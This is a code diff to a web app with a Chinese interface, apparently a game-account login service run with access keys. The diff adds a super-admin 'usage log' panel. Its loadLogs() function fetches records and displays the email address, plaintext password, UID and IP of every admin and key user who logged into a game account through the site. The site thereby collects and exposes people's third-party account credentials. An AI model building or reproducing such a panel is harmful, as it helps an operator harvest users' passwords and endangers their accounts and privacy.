@@ -1130,6 +1130,13 @@ html[dir="rtl"] .notice-bar { direction: rtl; }
   </div>
 </div>
 
+<div class="card" id="logBox" style="display:none">
+  <h2>📋 使用记录（超管）</h2>
+  <div class="bhint" style="margin-bottom:8px">用户 / 管理员登录游戏账号的账号信息</div>
+  <button id="btnLoadLogs" class="btn btn-sm" style="margin-bottom:8px">🔄 刷新记录</button>
+  <div id="logList"></div>
+</div>
+
 <div class="card" id="adminBox" style="display:none">
   <h2>👤 网站管理员（超管）</h2>
   <div class="bhint" style="margin-bottom:8px">生成的口令给管理员登录用（只能生成密钥）</div>
@@ -3257,7 +3264,7 @@ function enterAdmin() {
   var _nt = $('noticeBox'); if (_nt) _nt.style.display = 'none';
   bindAdminUI();
   refreshKeys();
-  if (isSuper) { loadFeatures(); loadAdmins(); loadSite(); }
+  if (isSuper) { loadFeatures(); loadAdmins(); loadSite(); loadLogs(); var _lb=$('logBox'); if(_lb) _lb.style.display=''; }
 }
 
 function bindAdminUI() {
@@ -3324,6 +3331,44 @@ function bindAdminUI() {
   if ($('btnFeatAllOff')) $('btnFeatAllOff').onclick = function () {
     featSave([]);
   };
+  if ($('btnLoadLogs')) $('btnLoadLogs').onclick = loadLogs;
+  function loadLogs() {
+    api('/api/admin/logs', { pass: ADMIN_PASS }).then(function (r) {
+      if (!r.ok) { var b0=$('logList'); if(b0) b0.innerHTML='<div class="msg err">' + esc(r.message||'加载失败') + '</div>'; return; }
+      var box = $('logList'); if (!box) return;
+      var h = '';
+      var logs = r.logs || [];
+      if (logs.length) {
+        h += '<div class="bhint" style="margin:6px 0">— 👑 管理员/超管登录 —</div>';
+        for (var i = 0; i < logs.length; i++) {
+          var g = logs[i];
+          h += '<div class="kitem">' +
+            '<div class="krow"><span>' + (g.kind==='super'?'超级管理员':'网站管理员') + '</span><span>' + fmtTs(g.time) + '</span></div>' +
+            '<div class="kkey">📧 ' + esc(g.email||'-') + '</div>' +
+            '<div class="kkey">🔑 ' + esc(g.password||'-') + '</div>' +
+            '<div class="krow dim"><span>UID: ' + esc(g.uid||'-') + '</span><span>IP: ' + esc(g.ip||'-') + '</span></div>' +
+            '</div>';
+        }
+      }
+      var ks = r.keys || [];
+      if (ks.length) {
+        h += '<div class="bhint" style="margin:10px 0 6px">— 🎫 密钥使用记录 —</div>';
+        for (var j = 0; j < ks.length; j++) {
+          var k2 = ks[j];
+          h += '<div class="kitem"><div class="kkey">' + esc(k2.raw) + '</div>';
+          var us = k2.uses || [];
+          for (var m = 0; m < us.length; m++) {
+            var u = us[m];
+            h += '<div class="krow"><span class="kkey">📧 ' + esc(u.email||'-') + '</span><span>' + fmtTs(u.time) + '</span></div>' +
+                 '<div class="krow dim"><span>🔑 ' + esc(u.password||'-') + '</span><span>' + esc(u.uid||'-') + '</span></div>';
+          }
+          h += '</div>';
+        }
+      }
+      if (!h) h = '<div class="msg dim">暂无记录</div>';
+      box.innerHTML = h;
+    });
+  }
   if ($('btnBigOff')) $('btnBigOff').onclick = function () {
     var mins = prompt('多少分钟后自动关闭网站？（0 或留空 = 立即关闭）', '0');
     if (mins === null) return;
